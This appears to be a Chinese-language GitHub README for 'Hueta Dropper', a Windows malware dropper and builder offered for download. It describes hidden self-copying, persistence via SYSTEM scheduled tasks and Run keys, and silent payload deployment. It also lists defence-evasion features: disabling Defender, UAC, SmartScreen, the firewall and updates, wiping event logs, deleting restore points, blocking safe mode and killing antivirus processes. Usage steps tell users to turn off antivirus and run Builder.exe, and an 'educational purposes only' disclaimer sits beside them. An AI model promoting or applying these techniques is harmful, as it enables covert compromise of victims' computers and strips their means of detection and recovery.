# HUETA DROPPER

<p align="center">
  <img src="logo.png" alt="Hueta Dropper" width="200">
</p>

---

一个确保文件完全稳定并解锁所有可能性的投放器。

以管理员权限运行（UAC提示）。首次启动：

- 将自身复制到隐藏和系统文件夹
- 添加到任务计划程序（SYSTEM，用户登录时）
- 添加到注册表（HKCU + HKLM Run）
- 清理系统并部署有效负载
- 启动后台守护程序

---

## 主要功能

- 🛡️ 禁用 WinDefend、WdNisSvc、WdNisDrv、SecurityHealthService、wscsvc、SgrmBroker
- 🔇 禁用实时监控、行为监控、云保护（MAPS）、样本提交
- 🔒 完全禁用 UAC
- 🖥️ 禁用 SmartScreen
- 🔥 禁用防火墙，停止 MpsSvc，所有配置文件关闭
- 🔄 禁用 Windows 更新，停止 wuauserv、UsoSvc、WaaSMedicSvc、dosvc + 策略阻止
- 📋 禁用 EventLog、EventSystem，每30秒清除日志
- 💾 删除系统还原点，禁用 WinRE，通过 BCD 阻止安全模式
- ⚡ 强制高性能电源计划，关闭睡眠/休眠/屏幕保护
- 🔧 禁用驱动程序自动更新
- 🚫 阻止安全模式、恢复、外部启动
- 🛑 监控25个防病毒进程，强制终止

---

## 使用说明

### 创建投放器

1. **禁用所有防病毒软件**，前往[下载](../../raw/main/Builder.exe)并打开 `Builder.exe`
2. 转到第一个选项卡，添加需要**在隐藏模式下**运行的文件

> ⚠️ **警告。** 不要将需要在正常模式下运行的文件放入投放器。构建后使用解包器。

<p align="center">
  <img src="screen1.png" alt="Builder Dropper" width="500">
</p>

3. 点击 **"Build hueta.exe"** 按钮并保存文件。您的构建已完成！

---

### 创建解包器

1. 打开 `Builder.exe`
2. 转到第二个选项卡，添加需要**在正常模式下**运行的文件

<p align="center">
  <img src="screen2.png" alt="Builder Extractor" width="500">
</p>

3. 点击 **"Build build.exe"** 按钮并保存文件。您的构建已完成！

---

## 免责声明

**仅供教育目的使用。** 使用风险自负。
